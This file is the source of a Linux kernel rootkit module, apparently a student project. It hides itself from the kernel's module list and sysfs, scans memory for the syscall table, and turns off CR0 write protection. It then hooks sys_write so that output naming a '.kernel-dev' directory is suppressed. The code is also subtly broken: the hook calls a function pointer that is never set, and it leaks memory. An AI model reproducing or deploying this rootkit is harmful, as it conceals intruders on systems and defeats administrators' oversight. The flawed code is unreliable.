#include <linux/module.h> // Included for all kernel modules.
#include <linux/kernel.h> // Included for KERN_INFO.
#include <linux/init.h> // Included for __init and __exit macros.
#include <linux/slab.h> // For usage of kmalloc.
#include <asm/paravirt.h> // For usage of Read_cr0 and Write_cr0.
#include <linux/syscalls.h> 
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/string.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Richard Kavanagh <richard.kavanagh7@mail.dcu.ie>");
MODULE_DESCRIPTION("A basic rootkit.");



/* Old stystem call function prototype. */
asmlinkage long (*ref_sys_write)(unsigned int fd, const char __user *buf, size_t count);

/* Our new system call function prototype.  */
asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count);


unsigned long **sys_call_table;


static unsigned long **get_sys_call_table(void)
{
    unsigned long int offset = PAGE_OFFSET;
    unsigned long **sct;

    printk("Beginning brute force seach for Syscall table at location: %lx\n", offset);

    while (offset < ULLONG_MAX) {
      
        sct = (unsigned long **)offset;
        /* Searching for bit pattern that matches sct[__NR_close]. */
        if (sct[__NR_close] == (unsigned long *) sys_close) {
            printk(KERN_INFO "Syscall table found at: %lx\n", offset);
            return sct;
        }

        offset += sizeof(void *);
    }
    return NULL;
}


asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);

asmlinkage ssize_t hidden_write(int fd, const char __user *buff, size_t count) {

    char *protected_name = ".kernel-dev";
    char *kbuff = (char *) kmalloc(256,GFP_KERNEL); /* Allocate kernel memory for memory from userland. */
    copy_from_user(kbuff,buff,255); /* Copy the userland moduleemory to the kernel memory allocation. */

    /* Check does the write contain the protected directory name. */
    if (strstr(kbuff,protected_name)) { 
        kfree(kbuff);
        /* Hide ls write error with ENOTDIR/ENOENT and return file exists error. */
        return EEXIST; 
    }
    /* Otherwise return data from original write system call. */
    return o_write(fd,buff,count); 

}


static int __init hidden_init(void)
{

    printk(KERN_INFO "Starting up module.\n");

    /*
    /* Hide the module from proc/modules, Sys/modules tracking. */
    list_del_init(&__this_module.list);
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* Locate address of the Syscall table in memory. */
    if(!(sys_call_table = get_sys_call_table())) {
        printk(KERN_INFO "Unable to locate Syscall table.");
        return -1;
    }

    /* Disabling WP bit in control register cr0 to write to sys_call table. */
    write_cr0(read_cr0() & (~ 0x10000));

    /* Storing the system to restore it after */
    ref_sys_write = (void *)sys_call_table[__NR_write];

    // write our modified read call to the syscall table
    sys_call_table[__NR_write] = (unsigned long *)hidden_write;

    /* Turning WP bit back on. */
    write_cr0(read_cr0() | 0x10000); 

    return 0; 
}
 
static void __exit hidden_cleanup(void)
{
    printk(KERN_INFO "Cleaning up module.\n");

     /* Disabling WP bit in control register cr0 to revert changes. */
    write_cr0(read_cr0() & (~ 0x10000));

    //xchg(&sys_call_table[__NR_write],o_write);

    sys_call_table[__NR_write] = (unsigned long *)ref_sys_write;

    /* Revert cr0 to WP only. */
    write_cr0(read_cr0() | 0x10000); 
}
 
module_init(hidden_init);
module_exit(hidden_cleanup);
